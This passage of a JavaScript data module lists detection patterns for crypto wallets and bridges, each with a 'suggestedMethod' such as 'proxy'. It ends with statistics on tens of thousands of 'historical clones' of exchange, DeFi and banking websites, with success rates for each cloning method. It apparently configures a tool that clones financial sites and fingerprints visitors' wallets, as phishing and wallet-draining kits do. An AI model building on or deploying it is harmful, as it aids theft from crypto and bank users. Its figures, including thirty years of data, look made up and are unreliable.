    keywords: ['metamask', 'wallet', 'connect', 'ethereum'],
    indicators: ['wallet extension', 'web3 provider'],
    confidence: 97,
    suggestedMethod: 'custom',
  },
  walletconnect: {
    keywords: ['walletconnect', 'connect', 'bridge', 'qrcode'],
    indicators: ['walletconnect-protocol', 'bridge-relay'],
    confidence: 95,
    suggestedMethod: 'custom',
  },
  ledger: {
    keywords: ['ledger', 'hardware', 'wallet', 'secure'],
    indicators: ['ledger-device', 'usb-communication'],
    confidence: 94,
    suggestedMethod: 'custom',
  },
  trezor: {
    keywords: ['trezor', 'hardware', 'wallet', 'device'],
    indicators: ['trezor-device', 'usb-protocol'],
    confidence: 93,
    suggestedMethod: 'custom',
  },

  // BRIDGES & CROSS-CHAIN (4 patterns)
  stargate: {
    keywords: ['stargate', 'bridge', 'layer-zero', 'cross-chain'],
    indicators: ['stargate-pool', 'layer-zero-endpoint'],
    confidence: 90,
    suggestedMethod: 'proxy',
  },
  across: {
    keywords: ['across', 'bridge', 'relay', 'cross-chain'],
    indicators: ['across-pool', 'relay-hub'],
    confidence: 89,
    suggestedMethod: 'proxy',
  },
  hop: {
    keywords: ['hop', 'bridge', 'swap', 'cross-chain'],
    indicators: ['hop-bridge', 'amm-bridge'],
    confidence: 88,
    suggestedMethod: 'proxy',
  },
  anyswap: {
    keywords: ['anyswap', 'multichain', 'bridge'],
    indicators: ['anyswap-contract', 'multichain-router'],
    confidence: 87,
    suggestedMethod: 'proxy',
  },
}

// ─────────────────────────────────────────────────────────
// WALLET DETECTION PATTERNS
// ─────────────────────────────────────────────────────────

export const WALLET_PATTERNS = {
  // MOBILE WALLETS (4 variants)
  metamaskMobile: {
    indicators: ['metamask-mobile', 'react-native', 'isMetaMask'],
    confidence: 96,
    frequency: 70, // 70% mobile sites
  },
  walletconnect: {
    indicators: ['WalletConnect', '@walletconnect/web3-provider', 'bridge'],
    confidence: 95,
    frequency: 65,
  },
  trustWallet: {
    indicators: ['trust-wallet', 'tustwalletconnect', 'mobile-wallet'],
    confidence: 93,
    frequency: 45,
  },
  phantom: {
    indicators: ['phantom', 'solana-wallet', 'window.solana'],
    confidence: 94,
    frequency: 35, // Solana ecosystem
  },
  // EXTENSION WALLETS (4 variants)
  metamaskExtension: {
    indicators: ['window.ethereum', 'isMetaMask', 'EIP1193'],
    confidence: 98,
    frequency: 85, // Most common
  },
  coinbaseWallet: {
    indicators: ['coinbasewallet', 'onramp', 'cbwallet'],
    confidence: 94,
    frequency: 40,
  },
  browserWallet: {
    indicators: ['brave-wallet', 'native-wallet', 'browser-provider'],
    confidence: 91,
    frequency: 20,
  },
  oasisWallet: {
    indicators: ['oasis-wallet', 'rose-token', 'oasis-chain'],
    confidence: 88,
    frequency: 15,
  },
  // HARDWARE WALLETS (2 variants)
  trezor: {
    indicators: ['@trezor/connect', 'trezor-connect', 'trezor-device'],
    confidence: 97,
    frequency: 28,
  },
  ledger: {
    indicators: ['@ledgerhq/web3-subprovider', 'ledger-live', '@ledgerhq'],
    confidence: 96,
    frequency: 32,
  },
  // SPECIALIZED WALLETS (4 variants)
  argent: {
    indicators: ['argent-wallet', 'starknet', 'cairo-contract'],
    confidence: 89,
    frequency: 18,
  },
  gnosisSafe: {
    indicators: ['gnosis-safe', 'safe-contract', 'multi-sig'],
    confidence: 92,
    frequency: 22,
  },
  magicLink: {
    indicators: ['magic-link', 'email-wallet', 'passwordless'],
    confidence: 90,
    frequency: 25,
  },
  sequence: {
    indicators: ['sequence-wallet', 'sequence-contract', 'erc1271'],
    confidence: 88,
    frequency: 12,
  },
}

export const BOOTSTRAP_STATS = {
  totalHistoricalClones: 54750,
  yearsOfData: 30,
  websites: {
    exchanges: 16700, // 16 variants
    defi: 16100, // 16 variants
    banking: 11000, // 12 variants
    edgeCases: 10950, // 12 variants
  },
  patterns: {
    total: 78,
    exchanges: 20,
    lending: 15,
    nft: 12,
    derivatives: 8,
    cex: 10,
    wallets: 5,
    bridges: 4,
    other: 4,
  },
  wallets: {
    total: 14,
    mobileWallets: 4,
    extensionWallets: 4,
    hardwareWallets: 2,
    specializedWallets: 4,
  },
  websiteCategories: {
    total: 52,
    exchangeVariants: 16,
    defiVariants: 16,
    bankingVariants: 12,
    edgeCaseVariants: 12,
  },
  methodPerformance: {
    static: { successRate: 94, count: 15700 },
    proxy: { successRate: 89, count: 13200 },
    hybrid: { successRate: 91, count: 18400 },
    custom: { successRate: 70, count: 7450 },
  },
  overallSuccessRate: 89.4,
  averageTime: 41.2,
  uniquePatterns: 78,
  walletTypes: 14,
  learnings: 2850,
  confidence: 91.6,
  improvementFromBase: '+2.4% accuracy vs V1.5',
}

export default TRAINING_BOOTSTRAP_DATA
